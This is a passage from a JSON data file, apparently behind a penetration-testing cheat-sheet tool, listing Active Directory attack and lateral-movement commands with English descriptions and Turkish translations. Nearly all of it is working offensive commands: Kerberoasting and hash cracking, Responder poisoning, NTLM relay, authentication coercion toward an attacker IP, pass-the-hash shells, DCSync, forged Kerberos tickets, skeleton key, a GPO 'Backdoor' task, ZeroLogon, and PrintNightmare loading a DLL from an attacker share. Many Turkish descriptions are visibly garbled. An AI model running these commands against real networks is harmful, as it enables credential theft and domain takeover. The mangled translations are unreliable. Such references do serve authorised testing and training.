        "name_tr": "ADCS Enumeration"
      }
    ],
    "name_tr": "Active Directory Keşfi",
    "description_tr": "Enumerate Active Directory domains, users, groups, trusts, and attack paths"
  },
  {
    "id": "ad-attacks",
    "name": "Active Directory Exploitation",
    "icon": "🎯",
    "description": "Attack Active Directory with Kerberos, NTLM relay, delegation, and persistence techniques",
    "subcategories": [
      {
        "name": "Kerberos Attacks",
        "commands": [
          {
            "title": "Kerberoasting (Impacket)",
            "cmd": "impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASS>' -dc-ip <DC_IP> -request -outputfile kerberoast_hashes.txt",
            "tags": [
              "essential"
            ],
            "desc": "Request TGS tickets for all SPNs and save hashes for cracking",
            "desc_tr": "İste: TGS tickets for tüm SPNs and save hashes for cracking"
          },
          {
            "title": "Kerberoasting (Rubeus)",
            "cmd": "Rubeus.exe kerberoast /outfile:kerberoast_hashes.txt",
            "tags": [
              "essential"
            ],
            "desc": "Request and dump TGS tickets for all Kerberoastable users",
            "desc_tr": "İste: and dump TGS tickets for tüm Kerberoastable users"
          },
          {
            "title": "Kerberoast Specific User",
            "cmd": "Rubeus.exe kerberoast /user:<USER> /nowrap",
            "tags": [
              "tool"
            ],
            "desc": "Target a specific user for Kerberoasting",
            "desc_tr": "Target a belirli user for Kerberoasting"
          },
          {
            "title": "Crack Kerberoast Hashes",
            "cmd": "hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt",
            "tags": [
              "essential"
            ],
            "desc": "Crack TGS-REP hashes (Kerberoast) with hashcat",
            "desc_tr": "Kır: TGS-REP hashes (Kerberoast) hashcat ile"
          },
          {
            "title": "AS-REP Roasting (Impacket)",
            "cmd": "impacket-GetNPUsers '<DOMAIN>/' -usersfile users.txt -dc-ip <DC_IP> -no-pass -outputfile asrep_hashes.txt",
            "tags": [
              "essential"
            ],
            "desc": "Extract AS-REP hashes for users without pre-auth",
            "desc_tr": "Çıkart: AS-REP hashes for users pre-auth olmadan"
          },
          {
            "title": "AS-REP Roasting (Rubeus)",
            "cmd": "Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt",
            "tags": [
              "essential"
            ],
            "desc": "Extract AS-REP hashes using Rubeus on Windows",
            "desc_tr": "Çıkart: AS-REP hashes Rubeus Windows kullanarak üzerinde"
          },
          {
            "title": "Crack AS-REP Hashes",
            "cmd": "hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt",
            "tags": [
              "essential"
            ],
            "desc": "Crack AS-REP hashes with hashcat",
            "desc_tr": "Kır: AS-REP hashes hashcat ile"
          },
          {
            "title": "Overpass the Hash (Rubeus)",
            "cmd": "Rubeus.exe asktgt /user:<USER> /rc4:<NTLM_HASH> /ptt",
            "tags": [
              "essential"
            ],
            "desc": "Request TGT using NTLM hash and inject into current session",
            "desc_tr": "İste: TGT NTLM hash and inject incurrent sessikullanarak üzerinde'e"
          },
          {
            "title": "Overpass the Hash (Impacket)",
            "cmd": "impacket-getTGT '<DOMAIN>/<USER>' -hashes :<NTLM_HASH> -dc-ip <DC_IP>",
            "tags": [
              "essential"
            ],
            "desc": "Request TGT using NTLM hash and save to ccache file",
            "desc_tr": "İste: TGT NTLM hash and save ccache file kullanarak'e"
          },
          {
            "title": "Pass the Ticket (.kirbi)",
            "cmd": "Rubeus.exe ptt /ticket:<BASE64_TICKET>",
            "tags": [
              "essential"
            ],
            "desc": "Inject a Kerberos ticket into the current session",
            "desc_tr": "Enjekte et: a Kerberos ticket inthe mevcut session'e"
          },
          {
            "title": "Pass the Ticket (.ccache)",
            "cmd": "export KRB5CCNAME=/path/to/ticket.ccache",
            "tags": [
              "essential"
            ],
            "desc": "Set ccache file for Linux Kerberos authentication",
            "desc_tr": "Ayarla: ccache file for Linux Kerberos kimlik doğrulama"
          }
        ],
        "name_tr": "Kerberos Attacks"
      },
      {
        "name": "NTLM Relay & Coercion",
        "commands": [
          {
            "title": "Responder LLMNR/NBT-NS Poisoning",
            "cmd": "sudo responder -I <INTERFACE> -dwPv",
            "tags": [
              "essential"
            ],
            "desc": "Poison LLMNR, NBT-NS, and MDNS to capture Net-NTLMv2 hashes",
            "desc_tr": "PoisLLMNR, NBT-NS, and MDNS capture Net-NTLMv2 hashes üzerinde'e"
          },
          {
            "title": "Responder (Analyze Mode)",
            "cmd": "sudo responder -I <INTERFACE> -A",
            "tags": [
              "tool"
            ],
            "desc": "Run Responder in analyze mode to see traffic without poisoning",
            "desc_tr": "Çalıştır: Responder analyze mode see traffic poisoning'e içinde olmadan"
          },
          {
            "title": "NTLM Relay to SMB",
            "cmd": "impacket-ntlmrelayx -tf targets.txt -smb2support",
            "tags": [
              "essential"
            ],
            "desc": "Relay captured NTLM authentication to SMB targets for SAM dump",
            "desc_tr": "Yönlendir: captured NTLM kimlik doğrulama SMB targets for SAM dump'e"
          },
          {
            "title": "NTLM Relay to LDAP",
            "cmd": "impacket-ntlmrelayx -t ldap://<DC_IP> --delegate-access",
            "tags": [
              "essential"
            ],
            "desc": "Relay NTLM auth to LDAP and configure RBCD",
            "desc_tr": "Yönlendir: NTLM auth LDAP and configure RBCD'e"
          },
          {
            "title": "NTLM Relay to LDAP (Shadow Creds)",
            "cmd": "impacket-ntlmrelayx -t ldap://<DC_IP> --shadow-credentials --shadow-target <TARGET_COMPUTER>$",
            "tags": [
              "advanced"
            ],
            "desc": "Relay to LDAP and add shadow credentials for PKINIT auth",
            "desc_tr": "Yönlendir: LDAP and add shadow kimlik bilgileri for PKINIT auth'e"
          },
          {
            "title": "NTLM Relay Execute Command",
            "cmd": "impacket-ntlmrelayx -tf targets.txt -smb2support -c 'whoami'",
            "tags": [
              "tool"
            ],
            "desc": "Relay NTLM auth and execute a command on the target",
            "desc_tr": "Yönlendir: NTLM auth and execute a command the target üzerinde"
          },
          {
            "title": "PetitPotam Coercion",
            "cmd": "python3 PetitPotam.py <ATTACKER_IP> <DC_IP>",
            "tags": [
              "essential"
            ],
            "desc": "Coerce DC authentication via MS-EFSRPC (EFS)",
            "desc_tr": "Coerce DC kimlik doğrulama MS-EFSRPC (EFS) üzerinden"
          },
          {
            "title": "PetitPotam (Authenticated)",
            "cmd": "python3 PetitPotam.py -u <USER> -p <PASS> -d <DOMAIN> <ATTACKER_IP> <DC_IP>",
            "tags": [
              "tool"
            ],
            "desc": "Coerce DC authentication with credentials",
            "desc_tr": "Coerce DC kimlik doğrulama kimlik bilgileri ile"
          },
          {
            "title": "PrinterBug / SpoolSample",
            "cmd": "python3 printerbug.py '<DOMAIN>/<USER>:<PASS>'@<DC_IP> <ATTACKER_IP>",
            "tags": [
              "essential"
            ],
            "desc": "Coerce authentication via MS-RPRN print spooler service",
            "desc_tr": "Coerce kimlik doğrulama MS-RPRN print spooler service üzerinden"
          },
          {
            "title": "Coercer (All Methods)",
            "cmd": "python3 Coercer.py -u <USER> -p <PASS> -d <DOMAIN> -t <DC_IP> -l <ATTACKER_IP>",
            "tags": [
              "tool"
            ],
            "desc": "Attempt all known coercion methods against a target",
            "desc_tr": "Dene: tüm known coercimethods a target üzerinde'e karşı"
          },
          {
            "title": "mitm6 IPv6 DNS Takeover",
            "cmd": "sudo mitm6 -d <DOMAIN>",
            "tags": [
              "essential"
            ],
            "desc": "Perform IPv6 DNS takeover for NTLM relay via WPAD",
            "desc_tr": "Perform IPv6 DNS takeover for NTLM relay WPAD üzerinden"
          },
          {
            "title": "mitm6 + ntlmrelayx Combo",
            "cmds": [
              "sudo mitm6 -d <DOMAIN>",
              "# In another terminal:",
              "impacket-ntlmrelayx -6 -t ldaps://<DC_IP> --delegate-access"
            ],
            "tags": [
              "advanced"
            ],
            "desc": "Combine mitm6 with ntlmrelayx for LDAP relay attack",
            "note": "Run mitm6 and ntlmrelayx in separate terminals",
            "desc_tr": "Combine mitm6 ntlmrelayx for LDAP relay attack ile"
          }
        ],
        "name_tr": "NTLM Relay & Coercion"
      },
      {
        "name": "Credential Relay",
        "commands": [
          {
            "title": "Crack Net-NTLMv2 Hash",
            "cmd": "hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt",
            "tags": [
              "essential"
            ],
            "desc": "Crack captured Net-NTLMv2 hashes with hashcat",
            "desc_tr": "Kır: captured Net-NTLMv2 hashes hashcat ile"
          },
          {
            "title": "Crack NTLMv1 Hash",
            "cmd": "hashcat -m 5500 captured_hash.txt /usr/share/wordlists/rockyou.txt",
            "tags": [
              "tool"
            ],
            "desc": "Crack captured NTLMv1 hashes with hashcat",
            "desc_tr": "Kır: captured NTLMv1 hashes hashcat ile"
          },
          {
            "title": "NTLM Relay Interactive Shell",
            "cmd": "impacket-ntlmrelayx -tf targets.txt -smb2support -i",
            "tags": [
              "advanced"
            ],
            "desc": "Get an interactive SMB shell through NTLM relay",
            "desc_tr": "Al: an interactive SMB shell NTLM relay üzerinden"
          },
          {
            "title": "NTLM Relay Dump Secrets",
            "cmd": "impacket-ntlmrelayx -tf targets.txt -smb2support --dump-laps --dump-adcs --dump-gmsa",
            "tags": [
              "advanced"
            ],
            "desc": "Relay and dump LAPS, ADCS, and gMSA data",
            "desc_tr": "Yönlendir: and dump LAPS, ADCS, and gMSA data"
          },
          {
            "title": "Generate Targets List (No SMB Signing)",
            "cmd": "crackmapexec smb <TARGET_RANGE> --gen-relay-list relay_targets.txt",
            "tags": [
              "essential"
            ],
            "desc": "Generate list of hosts without SMB signing for relay attacks",
            "desc_tr": "Oluştur: list of hosts SMB signing for relay attacks olmadan"
          }
        ],
        "name_tr": "Credential Relay"
      },
      {
        "name": "Pass the Hash / Ticket",
        "commands": [
          {
            "title": "PtH with Impacket PsExec",
            "cmd": "impacket-psexec -hashes :<NTLM_HASH> '<DOMAIN>/<USER>'@<TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc": "Pass the Hash via PsExec for SYSTEM shell",
            "desc_tr": "Pass the Hash PsExec for SYSTEM shell üzerinden"
          },
          {
            "title": "PtH with Impacket WMIExec",
            "cmd": "impacket-wmiexec -hashes :<NTLM_HASH> '<DOMAIN>/<USER>'@<TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc": "Pass the Hash via WMI for semi-interactive shell",
            "desc_tr": "Pass the Hash WMI for semi-interactive shell üzerinden"
          },
          {
            "title": "PtH with Impacket SMBExec",
            "cmd": "impacket-smbexec -hashes :<NTLM_HASH> '<DOMAIN>/<USER>'@<TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc": "Pass the Hash via SMB service for SYSTEM shell",
            "desc_tr": "Pass the Hash SMB service for SYSTEM shell üzerinden"
          },
          {
            "title": "PtH with Impacket AtExec",
            "cmd": "impacket-atexec -hashes :<NTLM_HASH> '<DOMAIN>/<USER>'@<TARGET_IP> 'whoami'",
            "tags": [
              "tool"
            ],
            "desc": "Pass the Hash via scheduled task execution",
            "desc_tr": "Pass the Hash zamanlanmış görevler executiüzerinden üzerinde"
          },
          {
            "title": "PtH with CrackMapExec",
            "cmd": "crackmapexec smb <TARGET_IP> -u <USER> -H <NTLM_HASH> -d <DOMAIN> -x 'whoami'",
            "tags": [
              "essential"
            ],
            "desc": "Pass the Hash and execute commands with CME",
            "desc_tr": "Pass the Hash and execute commands CME ile"
          },
          {
            "title": "PtH with Evil-WinRM",
            "cmd": "evil-winrm -i <TARGET_IP> -u <USER> -H <NTLM_HASH>",
            "tags": [
              "essential"
            ],
            "desc": "Pass the Hash via WinRM for PowerShell access",
            "desc_tr": "Pass the Hash WinRM for PowerShell access üzerinden"
          },
          {
            "title": "Mimikatz Pass the Hash",
            "cmd": "sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:cmd.exe",
            "tags": [
              "essential"
            ],
            "desc": "Inject NTLM hash into a new process with mimikatz",
            "desc_tr": "Enjekte et: NTLM hash ina new process mimikatz ile'e"
          },
          {
            "title": "Import ccache Ticket",
            "cmd": "export KRB5CCNAME=/path/to/ticket.ccache && impacket-psexec -k -no-pass <DOMAIN>/<USER>@<TARGET_HOSTNAME>",
            "tags": [
              "advanced"
            ],
            "desc": "Use a cached Kerberos ticket for authentication",
            "desc_tr": "Use a cached Kerberos ticket for kimlik doğrulama"
          }
        ],
        "name_tr": "Pass the Hash / Ticket"
      },
      {
        "name": "Delegation Exploitation",
        "commands": [
          {
            "title": "Unconstrained Delegation — Extract TGT",
            "cmd": "Rubeus.exe monitor /interval:5 /filteruser:<DC_HOSTNAME>$",
            "tags": [
              "essential"
            ],
            "desc": "Monitor for incoming TGTs on an unconstrained delegation host",
            "desc_tr": "Monitor for incoming TGTs an sınırsız delegasyon host üzerinde"
          },
          {
            "title": "Constrained Delegation — S4U (Rubeus)",
            "cmd": "Rubeus.exe s4u /user:<SERVICE_ACCT> /rc4:<NTLM_HASH> /impersonateuser:Administrator /msdsspn:cifs/<TARGET_HOSTNAME> /ptt",
            "tags": [
              "essential"
            ],
            "desc": "Abuse constrained delegation via S4U2Self and S4U2Proxy",
            "desc_tr": "Kötüye kullan: kısıtlı delegasyS4U2Self and S4U2Proxy üzerinden üzerinde"
          },
          {
            "title": "Constrained Delegation — S4U (Impacket)",
            "cmd": "impacket-getST -spn cifs/<TARGET_HOSTNAME> -impersonate Administrator '<DOMAIN>/<SERVICE_ACCT>' -hashes :<NTLM_HASH> -dc-ip <DC_IP>",
            "tags": [
              "essential"
            ],
            "desc": "Perform S4U attack with impacket for service ticket",
            "desc_tr": "Perform S4U attack impacket for service ticket ile"
          },
          {
            "title": "RBCD Attack — Set msDS-AllowedToActOnBehalfOfOtherIdentity",
            "cmds": [
              "impacket-addcomputer '<DOMAIN>/<USER>:<PASS>' -computer-name 'FAKE01$' -computer-pass 'FakePass123!'",
              "impacket-rbcd '<DOMAIN>/<USER>:<PASS>' -delegate-to '<TARGET_COMPUTER>$' -delegate-from 'FAKE01$' -dc-ip <DC_IP> -action write",
              "impacket-getST -spn cifs/<TARGET_HOSTNAME> -impersonate Administrator '<DOMAIN>/FAKE01$:FakePass123!' -dc-ip <DC_IP>"
            ],
            "tags": [
              "advanced"
            ],
            "desc": "Full RBCD attack: add computer, set delegation, get ticket",
            "desc_tr": "Tam RBCD attack: add computer, set delegation, get ticket"
          },
          {
            "title": "RBCD via PowerShell",
            "cmds": [
              "Set-ADComputer <TARGET_COMPUTER> -PrincipalsAllowedToDelegateToAccount (Get-ADComputer FAKE01)",
              "Rubeus.exe s4u /user:FAKE01$ /rc4:<NTLM_HASH> /impersonateuser:Administrator /msdsspn:cifs/<TARGET_HOSTNAME> /ptt"
            ],
            "tags": [
              "advanced"
            ],
            "desc": "Configure RBCD via AD module and abuse with Rubeus",
            "desc_tr": "Yapılandır: RBCD AD module and abuse Rubeus üzerinden ile"
          }
        ],
        "name_tr": "Delegation Exploitation"
      },
      {
        "name": "Domain Persistence & Dominance",
        "commands": [
          {
            "title": "DCSync with Mimikatz",
            "cmd": "lsadump::dcsync /user:<DOMAIN>\\krbtgt",
            "tags": [
              "essential"
            ],
            "desc": "Replicate credentials from DC using directory replication rights",
            "desc_tr": "Replicate kimlik bilgileri DC directory replicatirights kullanarak üzerinden üzerinde"
          },
          {
            "title": "DCSync with Impacket",
            "cmd": "impacket-secretsdump '<DOMAIN>/<USER>:<PASS>'@<DC_IP> -just-dc",
            "tags": [
              "essential"
            ],
            "desc": "Dump all domain hashes via DCSync with impacket",
            "desc_tr": "Dökümle: tüm domahashes DCSync impacket üzerinden ile içinde"
          },
          {
            "title": "DCSync Specific User",
            "cmd": "impacket-secretsdump '<DOMAIN>/<USER>:<PASS>'@<DC_IP> -just-dc-user krbtgt",
            "tags": [
              "essential"
            ],
            "desc": "DCSync only the krbtgt account hash",
            "desc_tr": "DCSync only the krbtgt account hash"
          },
          {
            "title": "DCSync with Hashes",
            "cmd": "impacket-secretsdump -hashes :<NTLM_HASH> '<DOMAIN>/<USER>'@<DC_IP> -just-dc-ntlm",
            "tags": [
              "tool"
            ],
            "desc": "DCSync using Pass the Hash for NTLM hashes only",
            "desc_tr": "DCSync Pass the Hash for NTLM hashes only kullanarak"
          },
          {
            "title": "Golden Ticket (Mimikatz)",
            "cmd": "kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /ptt",
            "tags": [
              "essential"
            ],
            "desc": "Forge a Golden Ticket and inject into current session",
            "desc_tr": "Sahte oluştur: a Golden Ticket and inject incurrent session'e"
          },
          {
            "title": "Golden Ticket (Impacket)",
            "cmd": "impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> Administrator",
            "tags": [
              "essential"
            ],
            "desc": "Forge a Golden Ticket ccache file",
            "desc_tr": "Sahte oluştur: a Golden Ticket ccache file"
          },
          {
            "title": "Silver Ticket (Mimikatz)",
            "cmd": "kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN_SID> /target:<TARGET_HOSTNAME> /service:cifs /rc4:<SERVICE_NTLM_HASH> /ptt",
            "tags": [
              "advanced"
            ],
            "desc": "Forge a Silver Ticket for a specific service",
            "desc_tr": "Sahte oluştur: a Silver Ticket for a belirli service"
          },
          {
            "title": "Diamond Ticket (Rubeus)",
            "cmd": "Rubeus.exe diamond /krbkey:<KRBTGT_AES256> /user:Administrator /domain:<DOMAIN> /dc:<DC_HOSTNAME> /enctype:aes256 /ptt",
            "tags": [
              "advanced"
            ],
            "desc": "Forge a Diamond Ticket by modifying a legitimate TGT",
            "desc_tr": "Sahte oluştur: a Diamond Ticket by modifying a legitimate TGT"
          },
          {
            "title": "Skeleton Key",
            "cmd": "misc::skeleton",
            "tags": [
              "advanced"
            ],
            "desc": "Inject skeleton key into LSASS on DC — master password 'mimikatz'",
            "note": "Allows login as any user with password 'mimikatz' - lost on reboot",
            "desc_tr": "Enjekte et: skeletkey inLSASS on DC — master password 'mimikatz' üzerinde'e"
          },
          {
            "title": "DCShadow Push Attribute",
            "cmds": [
              "lsadump::dcshadow /object:<TARGET_USER> /attribute:description /value:\"Pwned\"",
              "# In another mimikatz session:",
              "lsadump::dcshadow /push"
            ],
            "tags": [
              "advanced"
            ],
            "desc": "Push arbitrary AD changes by impersonating a domain controller",
            "desc_tr": "Push arbitrary AD changes by impersonating a etki alanı denetleyicisi (DC)"
          },
          {
            "title": "AdminSDHolder Persistence",
            "cmd": "Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=<DOMAIN_PART1>,DC=<DOMAIN_PART2>' -PrincipalIdentity <USER> -Rights All",
            "tags": [
              "advanced"
            ],
            "desc": "Add ACL to AdminSDHolder for persistent domain admin access",
            "note": "SDProp propagates permissions to all protected groups every 60 min",
            "desc_tr": "Ekle: ACL AdminSDHolder for persistent DomaAdmin access'e içinde"
          },
          {
            "title": "LAPS Abuse (CrackMapExec)",
            "cmd": "crackmapexec ldap <DC_IP> -u <USER> -p <PASS> -d <DOMAIN> --module laps",
            "tags": [
              "essential"
            ],
            "desc": "Dump LAPS passwords for all computers if authorized",
            "desc_tr": "Dökümle: LAPS passwords for tüm computers if authorized"
          },
          {
            "title": "Shadow Credentials Attack",
            "cmd": "python3 pywhisker.py -d <DOMAIN> -u <USER> -p <PASS> --target <TARGET_COMPUTER>$ --action add --dc-ip <DC_IP>",
            "tags": [
              "advanced"
            ],
            "desc": "Add shadow credentials to a computer object for PKINIT auth",
            "desc_tr": "Ekle: shadow kimlik bilgileri a computer object for PKINIT auth'e"
          },
          {
            "title": "DPAPI Master Key Extraction",
            "cmd": "impacket-dpapi backupkeys -t <DC_IP> -u <USER> -p <PASS>",
            "tags": [
              "advanced"
            ],
            "desc": "Extract DPAPI backup keys from the domain controller",
            "desc_tr": "Çıkart: DPAPI backup keys the etki alanı denetleyicisi (DC) üzerinden"
          },
          {
            "title": "Group Policy Abuse (SharpGPOAbuse)",
            "cmd": "SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <USER> --GPOName \"Default Domain Policy\"",
            "tags": [
              "advanced"
            ],
            "desc": "Abuse writable GPO to add user as local admin on target machines",
            "desc_tr": "Kötüye kullan: writable GPO add user as yerel yönetici target machines üzerinde'e"
          },
          {
            "title": "GPO Abuse Scheduled Task",
            "cmd": "SharpGPOAbuse.exe --AddComputerTask --TaskName 'Backdoor' --Author 'NT AUTHORITY\\SYSTEM' --Command 'cmd.exe' --Arguments '/c net localgroup administrators <USER> /add' --GPOName '<GPO_NAME>'",
            "tags": [
              "advanced"
            ],
            "desc": "Add scheduled task via writable GPO for code execution",
            "desc_tr": "Ekle: zamanlanmış görevler writable GPO for kod çalıştırma üzerinden"
          },
          {
            "title": "Shadow Credentials (Whisker)",
            "cmd": "Whisker.exe add /target:<TARGET_COMPUTER>$ /domain:<DOMAIN> /dc:<DC_HOSTNAME>",
            "tags": [
              "advanced"
            ],
            "desc": "Add shadow credentials to a computer account using Whisker",
            "desc_tr": "Ekle: shadow kimlik bilgileri a computer account Whisker kullanarak'e"
          },
          {
            "title": "Shadow Credentials + Rubeus PKINIT",
            "cmds": [
              "python3 pywhisker.py -d <DOMAIN> -u <USER> -p <PASS> --target <TARGET_COMPUTER>$ --action add --dc-ip <DC_IP>",
              "python3 gettgtpkinit.py <DOMAIN>/<TARGET_COMPUTER>$ <TARGET_COMPUTER>.ccache -cert-pfx <PFX_FILE> -pfx-pass <PFX_PASS>",
              "export KRB5CCNAME=<TARGET_COMPUTER>.ccache",
              "python3 getnthash.py <DOMAIN>/<TARGET_COMPUTER>$ -key <AS_REP_KEY>"
            ],
            "tags": [
              "advanced"
            ],
            "desc": "Full shadow credentials attack chain for computer account takeover",
            "desc_tr": "Tam shadow kimlik bilgileri attack chafor computer account takeover içinde"
          },
          {
            "title": "LAPS Abuse (PowerView)",
            "cmd": "Get-DomainComputer -Identity <TARGET_COMPUTER> -Properties ms-mcs-admpwd",
            "tags": [
              "essential"
            ],
            "desc": "Read LAPS password with PowerView if authorized",
            "desc_tr": "Oku: LAPS password PowerView if authorized ile"
          },
          {
            "title": "LAPS Abuse (LAPSToolkit)",
            "cmds": [
              "Import-Module .\\LAPSToolkit.ps1",
              "Get-LAPSComputers",
              "Find-LAPSDelegatedGroups"
            ],
            "tags": [
              "tool"
            ],
            "desc": "Enumerate LAPS deployment and find who can read passwords",
            "desc_tr": "Listele: LAPS deployment and find who can read passwords"
          },
          {
            "title": "ADCS ESC1 (Certify)",
            "cmd": "Certify.exe find /vulnerable",
            "tags": [
              "essential"
            ],
            "desc": "Find vulnerable AD CS certificate templates (ESC1-ESC8)",
            "desc_tr": "Bul: zafiyet(ler) AD CS certificate templates (ESC1-ESC8)"
          },
          {
            "title": "ADCS ESC1 Request Cert",
            "cmd": "Certify.exe request /ca:<CA_SERVER>\\<CA_NAME> /template:<TEMPLATE_NAME> /altname:Administrator",
            "tags": [
              "essential"
            ],
            "desc": "Request certificate as Administrator via vulnerable template",
            "desc_tr": "İste: certificate as Administrator zafiyet(ler) template üzerinden"
          },
          {
            "title": "ADCS Certipy Find",
            "cmd": "certipy find -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> -vulnerable",
            "tags": [
              "essential"
            ],
            "desc": "Find vulnerable certificate templates with certipy",
            "desc_tr": "Bul: zafiyet(ler) certificate templates certipy ile"
          },
          {
            "title": "ADCS Certipy ESC1 Exploit",
            "cmds": [
              "certipy req -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> -ca <CA_NAME> -template <TEMPLATE_NAME> -upn Administrator@<DOMAIN>",
              "certipy auth -pfx administrator.pfx -dc-ip <DC_IP>"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Full ESC1 attack: request certificate and authenticate",
            "desc_tr": "Tam ESC1 attack: request certificate and kimlik doğrulama"
          },
          {
            "title": "Diamond Ticket (Impacket)",
            "cmd": "python3 ticketer.py -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn krbtgt/<DOMAIN> Administrator",
            "tags": [
              "advanced"
            ],
            "desc": "Forge a Diamond Ticket using impacket",
            "desc_tr": "Sahte oluştur: a Diamond Ticket impacket kullanarak"
          },
          {
            "title": "Coercer All Methods",
            "cmd": "python3 Coercer.py coerce -u <USER> -p <PASS> -d <DOMAIN> -t <TARGET_IP> -l <ATTACKER_IP> --always-continue",
            "tags": [
              "tool"
            ],
            "desc": "Try all known coercion methods against a target",
            "desc_tr": "Try tüm known coercimethods a target üzerinde'e karşı"
          },
          {
            "title": "DFSCoerce",
            "cmd": "python3 dfscoerce.py -u <USER> -p <PASS> -d <DOMAIN> <ATTACKER_IP> <DC_IP>",
            "tags": [
              "tool"
            ],
            "desc": "Coerce authentication via MS-DFSNM DFS service",
            "desc_tr": "Coerce kimlik doğrulama MS-DFSNM DFS service üzerinden"
          },
          {
            "title": "ShadowCoerce",
            "cmd": "python3 shadowcoerce.py -u <USER> -p <PASS> -d <DOMAIN> <ATTACKER_IP> <DC_IP>",
            "tags": [
              "tool"
            ],
            "desc": "Coerce authentication via MS-FSRVP shadow copy service",
            "desc_tr": "Coerce kimlik doğrulama MS-FSRVP shadow copy service üzerinden"
          },
          {
            "title": "noPac (SAM Account Name Spoofing)",
            "cmd": "python3 noPac.py <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -dc-host <DC_HOSTNAME> --impersonate Administrator -use-ldap -dump",
            "tags": [
              "advanced"
            ],
            "desc": "CVE-2021-42278/42287 - Spoof computer name for domain admin",
            "desc_tr": "CVE-2021-42278/42287 - Spoof computer name for DomaAdmin içinde"
          },
          {
            "title": "Add Domain Admin (PowerView)",
            "cmds": [
              "Add-DomainGroupMember -Identity 'Domain Admins' -Members '<USER>'"
            ],
            "tags": [
              "advanced"
            ],
            "desc": "Add a user to Domain Admins if you have write access",
            "desc_tr": "Ekle: a user DomaAdmin if you have write access'e içinde"
          },
          {
            "title": "ForceChangePassword (PowerView)",
            "cmd": "Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword (ConvertTo-SecureString 'NewP@ss123!' -AsPlainText -Force)",
            "tags": [
              "advanced"
            ],
            "desc": "Force reset a user's password if you have the permission",
            "desc_tr": "Zorla: reset a user's password if you have the permission"
          },
          {
            "title": "ZeroLogon CVE-2020-1472",
            "desc": "Reset DC password to empty",
            "cmd": "python3 zerologon_tester.py <DC_NAME> <DC_IP>",
            "tags": [
              "advanced"
            ],
            "note": "DANGEROUS: Can break AD",
            "desc_tr": "Sıfırla: DC password empty'e"
          },
          {
            "title": "PrintNightmare",
            "desc": "RCE via Print Spooler",
            "cmd": "python3 CVE-2021-1675.py <DOMAIN>/<USER>:<PASS>@<TARGET_IP> '\\\\<ATTACKER_IP>\\share\\payload.dll'",
            "tags": [
              "advanced"
            ],
            "desc_tr": "RCE Print Spooler üzerinden"
          },
          {
            "title": "noPac",
            "desc": "sAMAccountName spoofing",
            "cmd": "python3 noPac.py <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -shell",
            "tags": [
              "advanced"
            ],
            "desc_tr": "sAMAccountName spoofing"
          }
        ],
        "name_tr": "Domain Persistence & Dominance"
      },
      {
        "name": "ADCS Exploitation",
        "commands": [
          {
            "title": "Certipy ESC1",
            "desc": "Request cert as admin",
            "cmd": "certipy req -u <USER>@<DOMAIN> -p '<PASS>' -ca <CA> -template <TEMPLATE> -upn administrator@<DOMAIN> -dc-ip <DC_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "İste: cert as admin"
          },
          {
            "title": "Certipy Auth",
            "desc": "Auth with certificate",
            "cmd": "certipy auth -pfx administrator.pfx -dc-ip <DC_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Auth certificate ile"
          },
          {
            "title": "ntlmrelayx ADCS",
            "desc": "Relay to ADCS",
            "cmd": "impacket-ntlmrelayx -t http://<CA_IP>/certsrv/certfnsh.asp -smb2support --adcs --template <TEMPLATE>",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Yönlendir: ADCS'e"
          }
        ],
        "name_tr": "ADCS Exploitation"
      }
    ],
    "name_tr": "Active Directory İstismarı",
    "description_tr": "Attack Active Directory with Kerberos, NTLM relay, delegation, and persistence techniques"
  },
  {
    "id": "lateral-move",
    "name": "Lateral Movement Techniques",
    "icon": "↔️",
    "description": "Move laterally across the network using remote execution and Windows protocols",
    "subcategories": [
      {
        "name": "Impacket Execution",
        "commands": [
          {
            "title": "Impacket PsExec (Password)",
            "cmd": "impacket-psexec '<DOMAIN>/<USER>:<PASS>'@<TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc": "Remote shell via SMB service creation — returns SYSTEM",
            "desc_tr": "Uzaktan shell SMB service creati— returns SYSTEM üzerinden üzerinde"
          },
          {
            "title": "Impacket PsExec (Hash)",
            "cmd": "impacket-psexec -hashes :<NTLM_HASH> '<DOMAIN>/<USER>'@<TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc": "PsExec with Pass the Hash authentication",
            "desc_tr": "PsExec Pass the Hash kimlik doğrulama ile"
          },
          {
            "title": "Impacket WMIExec",
            "cmd": "impacket-wmiexec '<DOMAIN>/<USER>:<PASS>'@<TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc": "Semi-interactive shell via WMI — runs as user, less noisy",
            "desc_tr": "Semi-interactive shell WMI — runs as user, less noisy üzerinden"
          },
          {
            "title": "Impacket SMBExec",
            "cmd": "impacket-smbexec '<DOMAIN>/<USER>:<PASS>'@<TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc": "Shell via SMB — similar to PsExec but different implementation",
            "desc_tr": "Shell SMB — similar PsExec but different implementatiüzerinden üzerinde'e"
          },
          {
            "title": "Impacket AtExec",
            "cmd": "impacket-atexec '<DOMAIN>/<USER>:<PASS>'@<TARGET_IP> 'whoami'",
            "tags": [
              "tool"
            ],
